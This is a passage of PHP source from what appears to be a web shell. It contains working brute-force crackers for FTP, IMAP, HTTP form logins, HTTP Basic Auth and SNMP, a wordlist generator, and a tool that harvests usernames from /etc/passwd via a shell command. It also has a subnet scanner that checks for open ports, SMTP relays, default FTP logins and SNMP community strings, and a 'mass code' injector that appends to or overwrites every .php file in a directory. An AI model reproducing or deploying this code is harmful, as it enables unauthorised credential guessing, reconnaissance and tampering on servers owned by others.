echo "<center><table border=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tbody><form method=\"POST\" name=\"form\" action=\"\"><tr><td width=\"40%\" bgcolor=\"#333333\">FTP cracker:</td><td bgcolor=\"#333333\"></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=\"text\" name=\"dictionary\" size=\"35\"></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Dictionary type:</td><td bgcolor=\"#808080\"><input type=\"radio\" name=\"combo\" checked=\"\" value=\"0\" onclick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=\"radio\" value=\"1\" name=\"combo\" onclick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Username:</td><td bgcolor=\"#666666\"><input type=\"text\" size=\"35\" value=\"root\" name=\"user\"></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Server:</td><td bgcolor=\"#808080\"><input type=\"text\" name=\"target\" value=\"localhost\" size=\"35\"></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=\"right\"><input class=\"buttons\" type=\"submit\" value=\"Start\"></td></tr></form></tbody></table></center>";

}
}

if ($act == "imap")
{
global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=yellow>Cracking ".htmlspecialchars($target)."...<br>";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$imap=imaplogiN($target,$user,$pass);
if($imap==-1){echo "$errorbox Can not connect to server.$et";break;}else{
if ($imap){echo "U: $user P: $pass<br>";if(!$type)break;}}
flusheR();
}
echo "<br/>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else 
{
echo "<center>IMAP cracker:$crack</center>";
}
print ('<center><table border="0" style="border-collapse: collapse" bordercolor= "#282828" width="40%"><tbody><form method="POST" name="form" action=""><tr><td width="40%" bgcolor="#333333">IMAP cracker:</td><td bgcolor="#333333"></td></tr><tr><td width="20%" bgcolor="#666666">Dictionary:</td><td bgcolor="#666666"><input type="text" name="dictionary" size="35" \></td></tr><tr><td width="20%" bgcolor="#808080" \>Dictionary type:</td><td bgcolor="#808080"><input type="radio" name="combo" checked="" value="0" onclick="document.form.user.disabled = false;" style="border-width:1px;background-color:#808080;" \>Simple (P)<input type="radio" value="1" name="combo" onclick="document.form.user.disabled = true;" style="border-width:1px;background-color:#808080;">Combo (U:P)</td></tr><tr><td width="20%" bgcolor="#666666" \>Username:</td><td bgcolor="#666666"><input type="text" size="35" value="root" name="use" \></td></tr><tr><td width="20%" bgcolor="#808080">Server:</td><td bgcolor="#808080"><input type="text" name="target" value="localhost" size="35" \></td></tr><tr><td width="20%" bgcolor="#666666"></td><td bgcolor="#666666" align="right"><input type="submit" value="Start" \></td></tr></form></tbody></table></center>');

}

if ($act == "dic")
{
global $errorbox,$windows,$footer,$t,$et,$hcwd;
if (!empty($_REQUEST['combo'])&&($_REQUEST['combo']==1)) $combo=1 ; else $combo=0;
if (!empty($_REQUEST['range']) && !empty($_REQUEST['output']) && !empty($_REQUEST['min']) && !empty($_REQUEST['max'])){
$min = $_REQUEST['min'];
$max = $_REQUEST['max'];
if($max<$min)die($errorbox ."Bad input!$et". $footer);
$s =$w="";
$out = $_REQUEST['output'];
$r = ($_REQUEST['range']=='a' )?'a':'A';
if ($_REQUEST['range']==0) $r=0;
for($i=0;$i<$min;$i++) $s.=$r;
$dic = fopen($out,'a');
if(is_nan($r)){
while(strlen($s)<=$max){
$w = $s;
if($combo)$w="$w:$w";
fwrite($dic,$w."\n");
$s++;}
}
else{
while(strlen($w)<=$max){
$w =(string)str_repeat("0",($min - strlen($s))).$s;
if($combo)$w="$w:$w";
fwrite($dic,$w."\n");
$s++;}
}
fclose($dic);
echo "<font color=yellow>Done</font>";
}
if (!empty($_REQUEST['input']) && !empty($_REQUEST['output'])){
$input=fopen($_REQUEST['input'],'r');
if (!$input){
if ($windows)echo $errorbox. "Unable to read from ".htmlspecialchars($_REQUEST['input']) ."$et<br>";
else{
$input=explode("\n",shelL("cat $input"));
$output=fopen($_REQUEST['output'],'w');
if ($output){
foreach ($input as $in){
$user = $in;
$user = trim(fgets($in)," \n\r");
if (!strstr($user,":"))continue;
$user=substr($user,0,(strpos($user,':')));
if($combo) fwrite($output,$user.":".$user."\n"); else fwrite($output,$user."\n");
}
fclose($input);fclose($output);
echo "<font color=yellow>Done</font>";
}
}
}
else{
$output=fopen($_REQUEST['output'],'w');
if ($output){
while (!feof($input)){
$user = trim(fgets($input)," \n\r");
if (!strstr($user,":"))continue;
$user=substr($user,0,(strpos($user,':')));
if($combo) fwrite($output,$user.":".$user."\n"); else fwrite($output,$user."\n");
}
fclose($input);fclose($output);
echo "<font color=yellow>Done</font>";
}
else echo $errorbox." Unable to write data to ".htmlspecialchars($_REQUEST['input']) ."$et<br>";
}
}elseif (!empty($_REQUEST['url']) && !empty($_REQUEST['output'])){
$res=downloadiT($_REQUEST['url'],$_REQUEST['output']);
if($combo && $res){
$file=file($_REQUEST['output']);
$output=fopen($_REQUEST['output'],'w');
foreach ($file as $v)fwrite($output,"$v:$v\n");
fclose($output);
}
echo "<font color=yellow>Done</font>";
}else{
$temp=whereistmP();
echo "<center>
<table>
<tr valign=top><td>
<table>Wordlist generator:<form method=\"POST\">
<tr>
<td width=\"20%\" bgcolor=\"#666666\">Range:</td>
<td bgcolor=\"#666666\">
<select name=range>
<option value=a>a-z</option>
<option value=Z>A-Z</option>
<option value=0>0-9</option></select>
</td></tr>
<tr>
<td width=\"20%\" bgcolor=\"#808080\">Min lenght:</td>
<td bgcolor=\"#808080\">
<select name=min>
<option value=1>1</option>
<option value=2>2</option>
<option value=3>3</option>
<option value=4>4</option>
<option value=5>5</option>
<option value=6>6</option>
<option value=7>7</option>
<option value=8>8</option>
<option value=9>9</option>
<option value=10>10</option>
</select>
</td></tr>
<tr><td width=\"20%\" bgcolor=\"#666666\">Max lenght:</td>
<td bgcolor=\"#666666\">
<select name=max><option value=2>2</option><option value=3>3</option><option value=4>4</option><option value=5>5</option><option value=6>6</option><option value=7>7</option><option value=8 selected>8</option><option value=9>9</option><option value=10>10</option><option value=11>11</option><option value=12>12</option><option value=13>13</option><option value=14>14</option><option value=15>15</option></select>
</td></tr>
<tr><td width=\"20%\" bgcolor=\"#808080\">Output:</td><td bgcolor=\"#808080\"><input type=text value=\"$temp/.dic\" name=output size=35></td></tr>
<tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\"><input type=checkbox name=combo style=\"border-width:1px;background-color:#666666;\" value=1 checked>Combo style output</td></tr>
<tr><td bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=Make></td></tr></form></table>
</td><td>
<table>Grab dictionary:
<form method=\"POST\">
<tr><td width=\"20%\" bgcolor=\"#666666\">Grab from:</td>
<td bgcolor=\"#666666\"><input type=text value=\"/etc/passwd\" name=input size=35></td></tr>
<tr><td width=\"20%\" bgcolor=\"#808080\">Output:</td>
<td bgcolor=\"#808080\"><input type=text value=\"$temp/.dic\" name=output size=35></td></tr>
<tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\"><input type=checkbox style=\"border-width:1px;background-color:#666666;\" name=combo value=1 checked>Combo style output</td></tr>
<tr>
<td bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=Grab></td></tr></form>
</table>
</td><td>
<table>Download dictionary:<form method=\"POST\">
<tr><td width=\"20%\" bgcolor=\"#666666\">URL:</td><td bgcolor=\"#666666\"><input type=text value=\"http://vburton.ncsa.uiuc.edu/wordlist.txt\" name=url size=35></td></tr>
<tr><td width=\"20%\" bgcolor=\"#808080\">Output:</td><td bgcolor=\"#808080\"><input type=text value=\"$temp/.dic\" name=output size=35></td></tr>
<tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\"><input type=checkbox style=\"border-width:1px;background-color:#666666;\" name=combo value=1 checked>Combo style output</td></tr>
<tr><td bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=right>$hcwd<input class=buttons type=submit value=Get></td></tr></form></table>
</td>
</tr></table>
</center>             ";}
}

if ($act == "htmlform")
{
global $errorbox,$footer,$et,$hcwd;
if(!empty($_REQUEST['start'])){
$url=$_REQUEST['target'];
$uf=$_REQUEST['userf'];
$pf=$_REQUEST['passf'];
$sf=$_REQUEST['submitf'];
$sv=$_REQUEST['submitv'];
$method=$_REQUEST['method'];
$fail=$_REQUEST['fail'];
$dic=$_REQUEST['dictionary'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
if(!file_exists($dic)) die("$errorbox Can not open dictionary.$et$footer");
$dictionary=fopen($dic,'r');
echo "<font color=blue>Cracking started...<br>";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$url.="?$uf=$user&$pf=$pass&$sf=$sv";
$res=check_urL($url,$method,$fail,12);
if (!$res){echo "<font color=blue>U: $user P: $pass</font><br>";flusheR();if(!$type)break;}
flusheR();
}
fclose($dictionary);
echo "Done!</font><br>";
}
else echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"434\"><tr><td width=\"174\" bgcolor=\"#333333\">HTTP Form cracker:</td><td bgcolor=\"#333333\" width=\"253\"></td></tr><form method=\"POST\" name=form><tr><td width=\"174\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\" width=\"253\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Dictionary type:</td><td bgcolor=\"#808080\"><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"174\" bgcolor=\"#666666\">Username:</td><td bgcolor=\"#666666\"><input type=text size=35 value=root name=user>$hcwd</td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Action Page:</td><td bgcolor=\"#808080\" width=\"253\"><input type=text name=target value=\"http://".getenv('HTTP_HOST')."/login.php\" size=35></td></tr><tr><td width=\"174\" bgcolor=\"#666666\">Method:</td><td bgcolor=\"#666666\" width=\"253\"><select size=\"1\" name=\"method\"><option selected value=\"POST\">POST</option><option value=\"GET\">GET</option></select></td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Username field name:</td><td bgcolor=\"#808080\" width=\"253\"><input type=text name=userf value=user size=35></td></tr><tr><td width=\"174\" bgcolor=\"#666666\">Password field name:</td><td bgcolor=\"#666666\" width=\"253\"><input type=text name=passf value=passwd size=35></td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Submit name:</td><td bgcolor=\"#808080\" width=\"253\"><input type=text value=login name=submitf size=35></td></tr><tr><td width=\"174\" bgcolor=\"#666666\">Submit value:</td><td bgcolor=\"#666666\" width=\"253\"><input type=text value=\"Login\" name=submitv size=35></td></tr><tr><td width=\"174\" bgcolor=\"#808080\">Fail string:</td><td bgcolor=\"#808080\" width=\"253\"><input type=text name=fail value=\"Try again\" size=35></td></tr><tr><td width=\"174\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right width=\"253\"><input class=buttons type=submit name=start value=Start></td></tr></form></table></center>";
}

if ($act == "basicauth")
{
global $errorbox,$et,$t,$crack,$hcwd;
if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$data='';
$method=($_REQUEST['method'])?'POST':'GET';
if(strstr($_REQUEST['target'],'?')){$data=substr($_REQUEST['target'],strpos($_REQUEST['target'],'?')+1);$_REQUEST['target']=substr($_REQUEST['target'],0,strpos($_REQUEST['target'],'?'));}
spliturL($_REQUEST['target'],$host,$page);
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
if($method='GET')$page.=$data;
$dictionary=fopen($_REQUEST['dictionary'],'r');
echo "<font color=blue>";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$so=fsockopen($host,80,$en,$es,5);
if(!$so){echo "$errorbox Can not connect to host$et";break;}
else{
$packet="$method /$page HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nConnection: Close\r\nAuthorization: Basic ".base64_encode("$user:$pass");
if($method=='POST')$packet.="Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($data);
$packet.="\r\n\r\n";
$packet.=$data;
fputs($so,$packet);
$res=substr(fgets($so),9,2);
fclose($so);
if($res=='20')echo "U: $user P: $pass</br>";
flusheR();
}
}
echo "Done!</font>";
}else echo "<center><form method=\"POST\" name=form><table><tr><td bgcolor=\"#333333\"><font color=silver>
HTTP Auth cracker:</font></td><td bgcolor=\"#333333\"><select name=method><option value=1>POST</option><option value=0>GET</option></select></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Dictionary type:</td><td bgcolor=\"#808080\"><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Username:</td><td bgcolor=\"#666666\"><input type=text size=35 value=root name=user></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Server:</td><td bgcolor=\"#808080\"><input type=text name=target value=localhost size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right>$hcwd<input class=buttons type=submit value=Start></td></tr></form></table></center>";
}

if ($act == "snmp")
{
global $t,$et,$errorbox,$crack,$hcwd;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "<font color=yellow>Cracking ".htmlspecialchars($target)."...<br>";flusheR();
while(!feof($dictionary)){
$com=trim(fgets($dictionary)," \n\r");
$res=snmpchecK($target,$com,2);
if($res)echo "$com<br>";
flusheR();
}
echo "<br>Done</font>";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
 echo "<center><table width=\"50%\">SNMP cracker:<form method=\"POST\">$hcwd<tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Server:</td><td bgcolor=\"#808080\"><input type=text name=target size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right><input class=buttons type=submit value=Start></td></tr></form></table></center>";
}



if ($act == "scanner")
{
global $hcwd;
if (!empty($_SERVER["SERVER_ADDR"])) $host=$_SERVER["SERVER_ADDR"];else $host ="127.0.0.1";
$udp=(empty($_REQUEST['udp']))?0:1;$tcp=(empty($_REQUEST['tcp']))?0:1;
if (($udp||$tcp) && !empty($_REQUEST['target']) && !empty($_REQUEST['fromport']) && !empty($_REQUEST['toport']) && !empty($_REQUEST['timeout']) && !empty($_REQUEST['portscanner'])){
$target=$_REQUEST['target'];$from=(int) $_REQUEST['fromport'];$to=(int)$_REQUEST['toport'];$timeout=(int)$_REQUEST['timeout'];$nu = 0;
echo "<font color=yellow>Port scanning started against ".htmlspecialchars($target).":<br>";
$start=time();
for($i=$from;$i<=$to;$i++){
if($tcp){
if (checkthisporT($target,$i,$timeout)){
$nu++;
$ser="";
if(getservbyport($i,"tcp"))$ser="(".getservbyport($i,"tcp").")";
echo "$nu) $i $ser (<a href=\"telnet://$target:$i\">Connect</a>) [TCP]<br>";
}
}
if($udp)if(checkthisporT($target,$i,$timeout,1)){$nu++;$ser="";if(getservbyport($i,"udp"))$ser="(".getservbyport($i,"udp").")";echo "$nu) $i $ser [UDP]<br>";}
flusheR();
}
$time=time()-$start;
echo "Done! ($time seconds)</font>";
}
elseif (!empty($_REQUEST['securityscanner'])){
echo "<font color=yellow>";
$start=time();
$from=$_REQUEST['from'];
$to=(int)$_REQUEST['to'];
$timeout=(int)$_REQUEST['timeout'];
$f = substr($from,strrpos($from,".")+1);
$from = substr($from,0,strrpos($from,"."));
if(!empty($_REQUEST['httpscanner'])){
echo "Loading webserver bug list...";
flusheR();
$buglist=whereistmP().DIRECTORY_SEPARATOR.namE();
$dl=@downloadiT('http://www.cirt.net/nikto/UPDATES/1.36/scan_database.db',$buglist);
if($dl){$file=file($buglist);echo "Done! scanning started.<br><br>";}else echo "Failed!!! scanning started without webserver security testing...<br><br>";
flusheR();
}else {$fr=htmlspecialchars($from); echo "Scanning $fr.$f-$fr.$to:<br><br>";}
for($i=$f;$i<=$to;$i++){
$output=0;
$ip="$from.$i";
if(!empty($_REQUEST['nslookup'])){
$hn=gethostbyaddr($ip);
if($hn!=$ip)echo "$ip [$hn]<br>";}
flusheR();
if(!empty($_REQUEST['ipscanner'])){
$port=$_REQUEST['port'];
if(strstr($port,","))$p=explode(",",$port);else $p[0]=$port;
$open=$ser="";
foreach($p as $po){
$scan=checkthisporT($ip,$po,$timeout);
if ($scan){
$ser="";
if($ser=getservbyport($po,"tcp"))$ser="($ser)";
$open.=" $po$ser ";
}
}
if($open){echo "$ip) Open ports:$open<br>";$output=1;}
flusheR();
}
if(!empty($_REQUEST['httpbanner'])){
$res=get_sw_namE($ip,$timeout);
if($res){
echo "$ip) Webserver software: ";
if($res==-1)echo "Unknow";
else echo $res;
echo "<br>";
$output=1;
}
flusheR();
}
if(!empty($_REQUEST['httpscanner'])){
if(checkthisporT($ip,80,$timeout) && !empty($file)){
$admin=array('/admin/','/adm/');
$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','smmsp','smtp','sshd','sys','test','unknown','uucp','web','www');
$nuke=array('/','/postnuke/','/postnuke/html/','/modules/','/phpBB/','/forum/');
$cgi=array('/cgi.cgi/','/webcgi/','/cgi-914/','/cgi-915/','/bin/','/cgi/','/mpcgi/','/cgi-bin/','/ows-bin/','/cgi-sys/','/cgi-local/','/htbin/','/cgibin/','/cgis/','/scripts/','/cgi-win/','/fcgi-bin/','/cgi-exe/','/cgi-home/','/cgi-perl/');
foreach ($file as $v){
$vuln=array();
$v=trim($v);
if(!$v || $v{0}=='#')continue;
$v=str_replace('","','^',$v);
$v=str_replace('"','',$v);
$vuln=explode('^',$v);
$page=$cqich=$nukech=$adminch=$userch=$vuln[1];
if(strstr($page,'@CGIDIRS'))
foreach($cgi as $cg){
$cqich=str_replace('@CGIDIRS',$cg,$page);
$url="http://$ip$cqich";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
elseif(strstr($page,'@ADMINDIRS'))
foreach ($admin as $cg){
$adminch=str_replace('@ADMINDIRS',$cg,$page);
$url="http://$ip$adminch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
elseif(strstr($page,'@USERS'))
foreach ($users as $cg){
$userch=str_replace('@USERS',$cg,$page);
$url="http://$ip$userch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
elseif(strstr($page,'@NUKE'))
foreach ($nuke as $cg){
$nukech=str_replace('@NUKE',$cg,$page);
$url="http://$ip$nukech";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
else{
$url="http://$ip$page";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
}
}
}
if(!empty($_REQUEST['smtprelay'])){
if(checkthisporT($ip,25,$timeout)){
$res='';
$res=checksmtP($ip,$timeout);
if($res==1){echo "$ip) SMTP relay found.<br>";$output=1;}flusheR();
}
}
if(!empty($_REQUEST['snmpscanner'])){
if(checkthisporT($ip,161,$timeout,1)){
$com=$_REQUEST['com'];
$coms=$res="";
if(strstr($com,","))$c=explode(",",$com);else $c[0]=$com;
foreach ($c as $v){
$ret=snmpchecK($ip,$v,$timeout);
if($ret)$coms .=" $v ";
}
if ($coms!=""){echo "$ip) SNMP FOUND: $coms<br>";$output=1;}
flusheR();
}
}
if(!empty($_REQUEST['ftpscanner'])){
if(checkthisporT($ip,21,$timeout)){
$usps=explode(',',$_REQUEST['userpass']);
foreach ($usps as $v){
$user=substr($v,0,strpos($v,':'));
$pass=substr($v,strpos($v,':')+1);
if($pass=='[BLANK]')$pass='';
$ftp=@ftp_connect($ip,21,$timeout);
if ($ftp){
if(@ftp_login($ftp,$user,$pass)){$output=1;echo "$ip) FTP FOUND: ($user:$pass) <a href=\"ftp://$ip\" target=\"_blank\">$ip</a> System type: ".ftp_systype($ftp)."<br>";}
}
flusheR();
}
}
}
if($output)echo "<hr size=1 noshade>";
flusheR();
}
$time=time()-$start;
echo "Done! ($time seconds)</font>";
if(!empty($buglist))unlink($buglist);
}
else{
$chbox=(extension_loaded('sockets'))?"<input type=checkbox name=tcp value=1 checked>TCP<input type=checkbox name=udp value=1 checked>UDP":"<input type=hidden name=tcp value=1>";
echo "<center><br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"50%\"><tr><form method=\"POST\"><td>Port scanner:</td></tr><td width=\"25%\" bgcolor=\"#808080\">Target:</td><td bgcolor=\"#808080\" width=80%><input name=target value=$host size=40></td></tr><tr><td bgcolor=\"#666666\" width=25%>From:</td><td bgcolor=\"#666666\" width=25%><input name=fromport type=text value=\"1\" size=5></td></tr><tr><td bgcolor=\"#808080\" width=25%>To:</td><td bgcolor=\"#808080\" width=25%><input name=toport type=text value=\"1024\" size=5></td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Timeout:</td><td bgcolor=\"#666666\"><input name=timeout type=text value=\"2\" size=5></td><tr><td width=\"25%\" bgcolor=\"#808080\">$chbox</td><td bgcolor=\"#808080\" align=\"right\">$hcwd<input type=submit class=buttons name=portscanner value=Scan></td></tr></form></table>";
$host = substr($host,0,strrpos($host,"."));
echo "<br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"50%\"><tr><form method=\"POST\" name=security><td>security scanner:</td></tr><td width=\"25%\" bgcolor=\"#808080\">From:</td><td bgcolor=\"#808080\" width=80%><input name=from value=$host.1 size=40> <input type=checkbox value=1 style=\"border-width:1px;background-color:#808080;\" name=nslookup checked>NS lookup</td></tr><tr><td bgcolor=\"#666666\" width=25%>To:</td><td bgcolor=\"#666666\" width=25%>xxx.xxx.xxx.<input name=to type=text value=254 size=4>$hcwd</td></tr><tr><td width=\"25%\" bgcolor=\"#808080\">Timeout:</td><td bgcolor=\"#808080\"><input name=timeout type=text value=\"2\" size=5></td></tr><tr><td width=\"25%\" bgcolor=\"#666666\"><input type=checkbox name=ipscanner value=1 checked onClick=\"document.security.port.disabled = !document.security.port.disabled;\" style=\"border-width:1px;background-color:#666666;\">Port scanner:</td><td bgcolor=\"#666666\"><input name=port type=text value=\"21,23,25,80,110,135,139,143,443,445,1433,3306,3389,8080,65301\" size=60></td></tr><tr><td width=\"25%\" bgcolor=\"#808080\"><input type=checkbox name=httpbanner value=1 checked style=\"border-width:1px;background-color:#808080;\">Get web banner</td><td bgcolor=\"#808080\"><input type=checkbox name=httpscanner value=1 checked style=\"border-width:1px;background-color:#808080;\">Webserver security scanning&nbsp;&nbsp;&nbsp;<input type=checkbox name=smtprelay value=1 checked style=\"border-width:1px;background-color:#808080;\">SMTP relay check</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\"><input type=checkbox name=ftpscanner value=1 checked onClick=\"document.security.userpass.disabled = !document.security.userpass.disabled;\" style=\"border-width:1px;background-color:#666666;\">FTP password:</td><td bgcolor=\"#666666\"><input name=userpass type=text value=\"anonymous:admin@nasa.gov,ftp:ftp,Administrator:[BLANK],guest:[BLANK]\" size=60></td></tr><tr><td width=\"25%\" bgcolor=\"#808080\"><input type=checkbox name=snmpscanner value=1 onClick=\"document.security.com.disabled = !document.security.com.disabled;\" checked style=\"border-width:1px;background-color:#808080;\">SNMP:</td><td bgcolor=\"#808080\"><input name=com type=text value=\"public,private,secret,cisco,write,test,guest,ilmi,ILMI,password,all private,admin,all,system,monitor,agent,manager,OrigEquipMfr,default,tivoli,openview,community,snmp,snmpd,Secret C0de,security,rmon,rmon_admin,hp_admin,NoGaH$@!,agent_steal,freekevin,0392a0,cable-docsis,fubar,ANYCOM,Cisco router,xyzzy,c,cc,cascade,yellow,blue,internal,comcomcom,apc,TENmanUFactOryPOWER,proxy,core,regional\" size=60></td></tr><tr><td width=\"25%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=\"right\"><input type=submit class=buttons name=securityscanner value=Scan></td></tr></form></table></center><br><center>";
}
}

if ($act == "masscode")
{
if(isset($_POST['dir']) &&
    $_POST['dir'] != '' &&
    isset($_POST['filetype']) &&
    $_POST['filetype'] != '' &&
    isset($_POST['mode']) &&
    $_POST['mode'] != '' && 
    isset($_POST['message']) &&
    $_POST['message'] != '' 
    )
    {
        $dir = $_POST['dir'];
        $filetype = $_POST['filetype'];
        $message = $_POST['message'];
        
        $mode = "a"; //default mode
        
        
        // Modes Begin
        
        if($_POST['mode'] == 'Apender')
        {
            $mode = "a";
        }
        if($_POST['mode'] == 'Overwriter')
        {
            $mode = "w";
        }
        
        if($handle = opendir($dir))
        {
            ?>
            Overwritten Files :-
            <ul style="padding: 5px;" >
            <?php
            while(($file = readdir($handle)) !== False)
            {
                if((preg_match("/$filetype".'$'.'/', $file , $matches) != 0) && (preg_match('/'.$file.'$/', $self , $matches) != 1))
                {
                    ?>
                        <li class="file"><a href="<?php echo "$self?open=$dir$file"?>"><?php echo $file; ?></a></li>
                    <?php
                    echo "\n";
                    $fd = fopen($dir.$file,$mode);
		    if (!$fd) echo "<p><font color=red>Permission Denied</font></p>"; break;
                    fwrite($fd,$message);
                }
            }
            ?>
            </ul>
            <?php
        }
    }
    else
    {
        ?>
        <table >
        
            <form method='POST'>
            <input type="hidden" name="injector"/>  
                <tr>
                    <td class="title">
                        Directory
                    </td>
                    <td>
                         <input name="dir" value="<?php echo getcwd().$SEPARATOR; ?>" />
                    </td>
                </tr>
                <tr>
                <td class="title">
                    Mode
                </td>
                <td>
                        <select style="width: 125px;" name="mode">
                            <option value="Apender">Apender</option>
                            <option value="Overwriter">Overwriter</option>
                        </select>
                </td>
                </tr>
                <tr>
                    <td class="title">
                        File Type
                    </td>
                    <td>
                        <input type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value=='')this.value='.php';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">I cant forget the time, i was trying to learn all this stuff without some guidance ..</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 315px; padding : 10px; width: 100px;" type="submit" value="Inject :D"/>
                    </td>
                </tr>
        </form>
        </table>
        <?php
    }
}

}
else

{

 @ob_clean();

 $images = array(

"arrow_ltr"=>

"R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".

"SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",

"back"=>

"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".

"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".

"Wg0JADs=",

"buffer"=>

"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".

"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".

"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",

"change"=>

